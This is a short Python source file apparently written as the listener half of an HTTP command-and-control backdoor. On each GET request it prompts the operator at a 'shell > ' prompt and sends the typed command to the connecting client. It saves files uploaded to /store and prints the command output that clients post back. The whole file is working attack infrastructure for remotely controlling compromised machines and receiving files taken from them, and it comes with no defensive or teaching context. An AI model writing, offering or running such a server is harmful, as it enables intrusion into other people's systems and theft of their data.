# HTTP SERVER

from http.server import BaseHTTPRequestHandler, HTTPServer
import os, cgi

HOST_NAME = "127.0.0.1"
PORT_NUMBER = 80


class MyHandler(BaseHTTPRequestHandler):

    def do_GET(self):

        command = input("shell > ")
        self.send_response_only(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(command.encode())

    def do_POST(self):

        if self.path == "/store":
            try:
                ctype, blabla = cgi.parse_header(self.headers["Content-Type"])
                if ctype == "multipart/form-data":
                    fs = cgi.FieldStorage(
                        fp=self.rfile,
                        headers=self.headers,
                        environ={"REQUEST_METHOD": "POST"}
                    )
                    fs_up = fs["file"]
                    with open("./test.txt", "w") as o:
                        o.write(fs_up.file.read().decode())
                        self.send_response(200)
                        self.end_headers()
                else:
                    print("[-] Undexpected POST request")
            except Exception as e:
                print(e)

            return

        self.send_response(200)
        self.end_headers()
        length = int(self.headers["Content-Length"])
        post_var = self.rfile.read(length)
        print(post_var.decode())


if __name__ == "__main__":

    httpd = HTTPServer((HOST_NAME, PORT_NUMBER), MyHandler)

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("[!] Server is terminated")
        httpd.server_close()